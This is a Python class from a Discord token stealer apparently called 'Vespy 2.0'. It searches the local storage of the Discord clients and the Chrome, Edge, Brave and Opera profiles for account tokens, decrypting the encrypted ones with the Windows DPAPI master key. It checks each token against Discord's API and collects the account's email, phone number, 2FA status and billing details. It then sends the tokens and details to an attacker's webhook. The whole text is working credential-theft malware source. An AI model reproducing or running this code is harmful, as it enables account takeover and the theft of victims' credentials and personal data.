class DISCORD:

    def __init__(self):
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        for i in paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        self.send()
    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        dtokens.append(token)
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(base64.b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            dtokens.append(token)
                                            self.tokens.append(token)
                                except:pass          
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
    def send(self):
        if len(self.tokens) > 0:
            for tok in self.tokens:
                try:
                    info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    user = info['username']+"#"+info['discriminator']
                    id = info['id']
                    email = info["email"]
                    if info["verified"]:
                        verf = ":white_check_mark:"
                    else:verf = ":x:"
                    phone = info["phone"]
                    avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
                    if info['mfa_enabled']:
                        af2 = ":white_check_mark:"
                    else:af2 = ":x:"
                    if info['premium_type']==0:
                        N=":x:"
                    elif info['premium_type']==1:
                        N="``Nitro Classic``"
                    elif info['premium_type']==2:
                        N="``Nitro Boost``"
                    elif info['premium_type']==3:
                        N="``Nitro Basic``"
                    else:N=":x:"
                    P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    if P == []:
                        bil = ":x:"
                    else:
                        for b in P:
                            if b['type']==1:
                                bil=":credit_card:"
                            elif b['type']==2:
                                bil=":regional_indicator_p:"
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n:email: Email: ``{email}``\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``")
                    embed.set_thumbnail(url=avatar)
                    webhook.add_embed(embed)
                    webhook.execute()
                except:pass
